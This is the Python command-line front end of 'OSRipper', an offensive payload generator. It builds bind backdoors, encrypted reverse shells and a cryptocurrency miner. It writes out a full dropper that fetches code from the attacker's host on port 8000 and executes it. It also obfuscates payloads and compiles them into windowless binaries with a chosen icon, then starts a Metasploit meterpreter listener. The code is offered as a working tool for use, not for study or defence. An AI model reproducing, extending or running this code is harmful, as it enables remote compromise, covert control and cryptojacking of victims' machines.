#!/usr/bin/env python3
"""
OSRipper CLI Interface
Advanced command-line interface for OSRipper payload generator
"""

import argparse
import sys
import os
from pathlib import Path
import json

# Import main functionality
import main

def create_parser():
    """Create and configure argument parser."""
    parser = argparse.ArgumentParser(
        description="OSRipper v0.3.1 - Advanced Payload Generator & Crypter",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s bind -p 4444                          # Create bind backdoor on port 4444
  %(prog)s reverse -h 192.168.1.100 -p 4444     # Create reverse shell
  %(prog)s reverse --ngrok -p 4444               # Use ngrok tunneling
  %(prog)s miner --address 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
  %(prog)s custom --script malware.py           # Encrypt custom script
  %(prog)s staged -h 192.168.1.100 -p 8080      # Create staged payload
  
  # Advanced options
  %(prog)s reverse -h 192.168.1.100 -p 4444 --obfuscate --compile --icon app.ico
        """)
    
    # Global options
    parser.add_argument('-v', '--version', action='version', 
                       version=f'OSRipper v{main.__version__}')
    parser.add_argument('--output', '-o', default='payload',
                       help='Output filename (default: payload)')
    parser.add_argument('--obfuscate', action='store_true',
                       help='Obfuscate the generated payload')
    parser.add_argument('--compile', action='store_true',
                       help='Compile payload to binary')
    parser.add_argument('--icon', help='Icon file for compiled binary')
    parser.add_argument('--quiet', '-q', action='store_true',
                       help='Quiet mode - minimal output')
    parser.add_argument('--config', help='Configuration file path')
    
    # Subcommands
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    
    # Bind backdoor
    bind_parser = subparsers.add_parser('bind', help='Create bind backdoor')
    bind_parser.add_argument('-p', '--port', required=True, type=int,
                           help='Port to bind to (1024-65535)')
    
    # Reverse shell
    reverse_parser = subparsers.add_parser('reverse', help='Create reverse shell')
    reverse_group = reverse_parser.add_mutually_exclusive_group(required=True)
    reverse_group.add_argument('--ngrok', action='store_true',
                             help='Use ngrok tunneling')
    reverse_group.add_argument('-h', '--host', help='Callback IP address')
    reverse_parser.add_argument('-p', '--port', required=True, type=int,
                              help='Callback port (1024-65535)')
    
    # BTC Miner
    miner_parser = subparsers.add_parser('miner', help='Create BTC miner')
    miner_parser.add_argument('--address', required=True,
                            help='Bitcoin payout address')
    
    # Custom crypter
    custom_parser = subparsers.add_parser('custom', help='Encrypt custom script')
    custom_parser.add_argument('--script', required=True,
                             help='Path to Python script to encrypt')
    
    # Staged payload
    staged_parser = subparsers.add_parser('staged', help='Create staged payload')
    staged_group = staged_parser.add_mutually_exclusive_group(required=True)
    staged_group.add_argument('--ngrok', action='store_true',
                            help='Use ngrok tunneling')
    staged_group.add_argument('-h', '--host', help='Callback IP address')
    staged_parser.add_argument('-p', '--port', required=True, type=int,
                             help='Callback port (1024-65535)')
    
    # Interactive mode
    interactive_parser = subparsers.add_parser('interactive', help='Interactive mode')
    
    return parser

def load_config(config_path):
    """Load configuration from file."""
    try:
        with open(config_path, 'r') as f:
            return json.load(f)
    except Exception as e:
        print(f"❌ Error loading config: {e}")
        return {}

def validate_args(args):
    """Validate command line arguments."""
    if args.command in ['bind', 'reverse', 'staged']:
        if not (1024 <= args.port <= 65535):
            print("❌ Port must be between 1024 and 65535")
            return False
    
    if args.command == 'reverse' and args.host:
        try:
            import socket
            socket.inet_aton(args.host)
        except socket.error:
            print("❌ Invalid IP address format")
            return False
    
    if args.command == 'custom':
        if not os.path.isfile(args.script):
            print("❌ Script file not found")
            return False
        if not args.script.endswith('.py'):
            print("❌ Script must be a Python file (.py)")
            return False
    
    if args.command == 'miner':
        if not (26 <= len(args.address) <= 35):
            print("❌ Invalid Bitcoin address format")
            return False
    
    if args.icon and not os.path.isfile(args.icon):
        print("❌ Icon file not found")
        return False
    
    return True

def execute_bind(args):
    """Execute bind backdoor generation."""
    if not args.quiet:
        print(f"🔗 Creating bind backdoor on port {args.port}")
    
    # Set global variables for compatibility
    main.name = args.output
    main.port = str(args.port)
    main.bind = "1"
    
    # Generate payload
    main.gen_bind()
    
    return True

def execute_reverse(args):
    """Execute reverse shell generation."""
    if not args.quiet:
        print("🔐 Creating encrypted reverse shell")
    
    # Set global variables
    main.name = args.output
    main.bind = 0
    
    if args.ngrok:
        if not args.quiet:
            print(f"🌐 Setting up ngrok tunnel on port {args.port}")
        try:
            from ripgrok import get_tunnels
            print(f"Please run: ngrok tcp {args.port}")
            input("Press Enter when ngrok is ready...")
            tunnel_info = get_tunnels()
            main.host, main.port = tunnel_info.split(":")
            if not args.quiet:
                print(f"✅ Ngrok tunnel: {main.host}:{main.port}")
        except Exception as e:
            print(f"❌ Ngrok setup failed: {e}")
            return False
    else:
        main.host = args.host
        main.port = str(args.port)
    
    # Generate payload
    main.gen_rev_ssl_tcp()
    
    return True

def execute_miner(args):
    """Execute BTC miner generation."""
    if not args.quiet:
        print(f"⛏️  Creating BTC miner for address: {args.address}")
    
    # Set global variables
    main.name = args.output
    
    # Generate miner code
    miner_code = f'''
import socket
import json
import hashlib
import binascii
import time
import random

def main():
    address = "{args.address}"
    nonce = hex(random.randint(0, 2**32-1))[2:].zfill(8)
    
    host = 'solo.ckpool.org'
    port = 3333
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        
        # Mining implementation
        sock.sendall(b'{{"id": 1, "method": "mining.subscribe", "params": []}}\n')
        lines = sock.recv(1024).decode().split('\n')
        response = json.loads(lines[0])
        sub_details, extranonce1, extranonce2_size = response['result']
        
        auth_msg = f'{{"params": ["{args.address}", "password"], "id": 2, "method": "mining.authorize"}}\n'
        sock.sendall(auth_msg.encode())
        
        # Mining loop continues...
        sock.close()
        
    except Exception:
        time.sleep(10)
        main()

if __name__ == "__main__":
    while True:
        main()
'''
    
    with open(args.output, 'w') as f:
        f.write(miner_code)
    
    if not args.quiet:
        print(f"✅ BTC miner generated: {args.output}")
        print("📊 Monitor at: https://solo.ckpool.org/")
    
    return True

def execute_custom(args):
    """Execute custom script encryption."""
    if not args.quiet:
        print(f"🎭 Encrypting custom script: {args.script}")
    
    # Set global variables
    main.name = args.output
    
    try:
        with open(args.script, 'r') as source:
            with open(args.output, 'w') as target:
                target.write(source.read())
        
        if not args.quiet:
            print(f"✅ Custom script processed: {args.output}")
        
        return True
        
    except Exception as e:
        print(f"❌ Error processing script: {e}")
        return False

def execute_staged(args):
    """Execute staged payload generation."""
    if not args.quiet:
        print("🌐 Creating staged payload")
    
    # First create the main payload
    if not execute_reverse(args):
        return False
    
    # Create webroot and move payload
    os.makedirs("webroot", exist_ok=True)
    payload_file = f"{args.output}_or.py" if main.encrypted else f"{args.output}.py"
    
    if os.path.exists(payload_file):
        import shutil
        shutil.move(payload_file, f"webroot/{payload_file}")
    
    # Create dropper
    dropper_code = f'''
import requests
import time
import random

def download_and_execute():
    try:
        url = "http://{main.host}:8000/{payload_file}"
        time.sleep(random.randint(1, 10))
        
        response = requests.get(url, timeout=30)
        if response.status_code == 200:
            exec(response.text)
        else:
            time.sleep(300)
            download_and_execute()
    except Exception:
        time.sleep(300)
        download_and_execute()

if __name__ == "__main__":
    download_and_execute()
'''
    
    with open("dropper.py", 'w') as f:
        f.write(dropper_code)
    
    # Start web server
    main.start_web_server("webroot")
    
    if not args.quiet:
        print("✅ Staged payload created")
        print("📁 Dropper: dropper.py")
        print("🌐 Web server started on port 8000")
    
    return True

def post_process(args):
    """Handle post-processing options."""
    if args.obfuscate:
        try:
            import obfuscator
            filename = f"{args.output}_or.py" if main.encrypted else args.output
            obfuscator.MainMenu(filename)
            main.encrypted = True
            if not args.quiet:
                print("✅ Payload obfuscated")
        except Exception as e:
            print(f"❌ Obfuscation failed: {e}")
    
    if args.compile:
        try:
            os.makedirs("dist", exist_ok=True)
            source_file = f"{args.output}_or.py" if main.encrypted else f"{args.output}.py"
            
            cmd_parts = [
                "python3", "-m", "nuitka",
                "--standalone",
                "--include-module=sandboxed",
                "--disable-console",
                "--windows-disable-console",
                "--onefile",
                "--assume-yes-for-downloads"
            ]
            
            if args.icon:
                if os.name == 'posix' and 'darwin' in os.uname().sysname.lower():
                    cmd_parts.append(f"--macos-onefile-icon={args.icon}")
                else:
                    cmd_parts.append(f"--windows-icon-from-ico={args.icon}")
            
            cmd_parts.append(source_file)
            
            if not args.quiet:
                print("🔨 Compiling payload...")
            
            import subprocess
            result = subprocess.run(cmd_parts, capture_output=True, text=True)
            
            if result.returncode == 0:
                if not args.quiet:
                    print("✅ Compilation successful!")
                    print("📁 Binary saved in: dist/")
            else:
                print("❌ Compilation failed")
                if not args.quiet:
                    print(f"Error: {result.stderr}")
                    
        except Exception as e:
            print(f"❌ Compilation error: {e}")

def start_listener_if_needed(args):
    """Start Metasploit listener if needed."""
    if args.command in ['reverse', 'staged'] and not main.bind:
        try:
            if not args.quiet:
                print("🎯 Starting Metasploit listener...")
            
            cmd = f"msfconsole -q -x 'use multi/handler; set payload python/meterpreter/reverse_tcp_ssl; set LHOST 0.0.0.0; set LPORT {main.port}; exploit'"
            os.system(cmd)
            
        except Exception as e:
            print(f"❌ Failed to start listener: {e}")

def main_cli():
    """Main CLI entry point."""
    parser = create_parser()
    
    if len(sys.argv) == 1:
        parser.print_help()
        return
    
    args = parser.parse_args()
    
    # Load config if specified
    if args.config:
        config = load_config(args.config)
        # Apply config values as defaults
        for key, value in config.items():
            if not hasattr(args, key) or getattr(args, key) is None:
                setattr(args, key, value)
    
    # Validate arguments
    if not validate_args(args):
        return
    
    # Handle interactive mode
    if args.command == 'interactive':
        main.main()
        return
    
    # Show banner unless quiet
    if not args.quiet:
        main.clear_screen()
        main.display_logo()
        print(f"🚀 OSRipper CLI v{main.__version__}")
        print("─" * 50)
    
    # Execute command
    success = False
    
    if args.command == 'bind':
        success = execute_bind(args)
    elif args.command == 'reverse':
        success = execute_reverse(args)
    elif args.command == 'miner':
        success = execute_miner(args)
    elif args.command == 'custom':
        success = execute_custom(args)
    elif args.command == 'staged':
        success = execute_staged(args)
    
    if not success:
        print("❌ Operation failed")
        return
    
    # Post-processing
    post_process(args)
    
    # Start listener if needed
    start_listener_if_needed(args)
    
    if not args.quiet:
        print("\n✅ Operation completed successfully!")
        print("📁 Check the 'dist' directory for compiled files")
        print("\n🏴‍☠️ Thanks for using OSRipper!")

if __name__ == "__main__":
    main_cli()
